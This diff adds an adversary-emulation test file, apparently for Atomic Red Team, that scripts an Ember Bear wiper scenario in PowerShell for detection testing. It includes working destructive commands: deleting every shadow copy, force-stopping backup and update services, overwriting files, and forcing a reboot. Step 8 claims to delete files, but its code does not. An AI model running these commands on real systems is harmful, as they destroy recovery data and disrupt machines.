@@ -1,0 +1,183 @@
+attack_technique: EmberBear_Wiper
+display_name: Ember Bear (UAC-0056) – Destructive Wiper Attack Scenario (Enhanced)
+description: >
+  Kịch bản mô phỏng chiến dịch phá hoại của Ember Bear (wiper/destructive),
+  nhấn mạnh hành vi rõ ràng trong từng bước: discovery, reconnaissance,
+  service disruption, data overwrite, xóa recovery, shutdown.
+
+atomic_tests:
+
+# -----------------------------------------------------------------------------
+# STEP 1 – T1082: System Information Discovery (verbose)
+# -----------------------------------------------------------------------------
+- name: "[1] T1082 - System Information Discovery"
+  description: >
+    Liệt kê phiên bản OS, hostname, user, IP config để xác nhận môi trường.
+  supported_platforms: [windows]
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Write-Host "=== SYSTEM INFORMATION DISCOVERY ==="
+      Write-Host "`n--- OS & System ---"
+      systeminfo
+      Write-Host "`n--- User & Identity ---"
+      whoami
+      Write-Host "`n--- IP Configuration ---"
+      ipconfig /all
+      Write-Host "`n--- Network Interfaces ---"
+      Get-NetAdapter | Format-Table -AutoSize
+
+# -----------------------------------------------------------------------------
+# STEP 2 – T1057: Process Discovery (verbose)
+# -----------------------------------------------------------------------------
+- name: "[2] T1057 - Process Discovery"
+  description: >
+    Liệt kê tiến trình đang chạy để hiểu dịch vụ/scope mục tiêu.
+  supported_platforms: [windows]
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Write-Host "=== PROCESS DISCOVERY ==="
+      Get-Process | Sort-Object -Property CPU -Descending | Format-Table -AutoSize
+      Write-Host "`n--- Top 20 by Memory ---"
+      Get-Process | Sort-Object -Property WS -Descending | Select-Object -First 20
+
+# -----------------------------------------------------------------------------
+# STEP 3 – T1003.001: LSASS Access (Safe)
+# -----------------------------------------------------------------------------
+- name: "[3] T1003.001 - LSASS Access (Simulated)"
+  description: >
+    Mô phỏng truy cập những vùng credential (chỉ safe), thể hiện privilege escalation.
+  supported_platforms: [windows]
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Write-Host "=== SIMULATE LSASS ACCESS ==="
+      # Chỉ liệt kê handle LSASS (không extract)
+      Get-Process lsass | ForEach-Object {
+        "PID: $($_.Id) Path: $($_.Path)"
+      }
+      # Dùng Sysinternals handle.exe nếu có
+      if (Get-Command handle.exe -ErrorAction SilentlyContinue) {
+        handle.exe -p lsass
+      } else {
+        Write-Host "handle.exe not found, skipping."
+      }
+
+# -----------------------------------------------------------------------------
+# STEP 4 – T1560.001: Archive TestData (explicit)
+# -----------------------------------------------------------------------------
+- name: "[4] T1560.001 - Archive TestData to ZIP"
+  description: >
+    Gom tất cả file trong C:\TestData để nén vào ZIP trước khi overwrite.
+  supported_platforms: [windows]
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Write-Host "=== ARCHIVE TestData ==="
+      if (!(Test-Path C:\Users\Public\ember_stage)) {
+        New-Item -ItemType Directory -Path C:\Users\Public\ember_stage | Out-Null
+      }
+      $zipPath = "C:\Users\Public\ember_stage\TestData_before_wipe.zip"
+      if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+      Compress-Archive -Path "C:\TestData\*" -DestinationPath $zipPath
+      Write-Host "Created ZIP: $zipPath"
+      # List nội dung ZIP
+      Expand-Archive -Path $zipPath -DestinationPath C:\Users\Public\ember_stage\zip_temp -Force
+      Get-ChildItem C:\Users\Public\ember_stage\zip_temp -Recurse
+
+# -----------------------------------------------------------------------------
+# STEP 5 – T1074.001: Local Data Staging (explicit)
+# -----------------------------------------------------------------------------
+- name: "[5] T1074.001 - Local Data Staging"
+  description: >
+    Stage file ZIP vào thư mục staging rõ rệt và log hành vi.
+  supported_platforms: [windows]
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Write-Host "=== LOCAL DATA STAGING ==="
+      $src = "C:\Users\Public\ember_stage\TestData_before_wipe.zip"
+      $dest = "C:\Users\Public\ember_stage\staging\TestData_raw.zip"
+      if (!(Test-Path (Split-Path $dest))) {
+        New-Item -ItemType Directory -Path (Split-Path $dest) | Out-Null
+      }
+      Copy-Item $src -Destination $dest -Force
+      Write-Host "Staged: $dest"
+      Get-ChildItem "C:\Users\Public\ember_stage\staging" -Recurse
+
+# -----------------------------------------------------------------------------
+# STEP 6 – T1490: Inhibit System Recovery (delete shadow copies)
+# -----------------------------------------------------------------------------
+- name: "[6] T1490 - Inhibit System Recovery"
+  description: >
+    Xóa Volume Shadow Copies để ngăn khôi phục sau overwrite.
+  supported_platforms: [windows]
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Write-Host "=== DELETE SHADOW COPIES ==="
+      vssadmin delete shadows /all /quiet
+      Write-Host "Shadow copies removed."
+      vssadmin list shadows
+
+# -----------------------------------------------------------------------------
+# STEP 7 – T1489: Service Stop (explicit)
+# -----------------------------------------------------------------------------
+- name: "[7] T1489 - Stop Critical Services"
+  description: >
+    Dừng dịch vụ có thể cản trở overwrite: Windows Update, Superfetch, Backup APIs.
+  supported_platforms: [windows]
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Write-Host "=== STOP SERVICES ==="
+      $services = @("wuauserv","SysMain","bits","VSS")
+      foreach ($s in $services) {
+        Write-Host "Stopping $s..."
+        Stop-Service -Name $s -Force -ErrorAction SilentlyContinue
+        Get-Service -Name $s
+      }
+
+# -----------------------------------------------------------------------------
+# STEP 8 – T1485: Data Destruction (overwrite + delete)
+# -----------------------------------------------------------------------------
+- name: "[8] T1485 - Data Destruction (overwrite & delete)"
+  description: >
+    Overwrite nội dung file bằng pattern, rename, sau đó delete rõ rệt.
+  supported_platforms: [windows]
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Write-Host "=== DATA DESTRUCTION ==="
+      $targetFiles = Get-ChildItem "C:\TestData" -Recurse -File
+      foreach ($f in $targetFiles) {
+        Write-Host "Overwriting $($f.FullName)…"
+        Set-Content -Path $f.FullName -Value ("WIPED_BY_EMBER_BEAR_"+(Get-Date).ToString()) -Force
+        Write-Host "Renaming with .emberwipe extension"
+        Rename-Item -Path $f.FullName -NewName ("$($f.Name).emberwipe")
+      }
+      Write-Host "`n--- Deleting original files & verifying ---"
+      Get-ChildItem "C:\TestData" -Recurse -File
+
+# -----------------------------------------------------------------------------
+# STEP 9 – T1529: System Shutdown / Reboot
+# -----------------------------------------------------------------------------
+- name: "[9] T1529 - System Shutdown"
+  description: >
+    Shutdown hệ thống để hoàn tất tác động destructive.
+  supported_platforms: [windows]
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Write-Host "=== SYSTEM SHUTDOWN INITIATED ==="
+      Shutdown /r /t 15 /c "Ember Bear destructive shutdown"
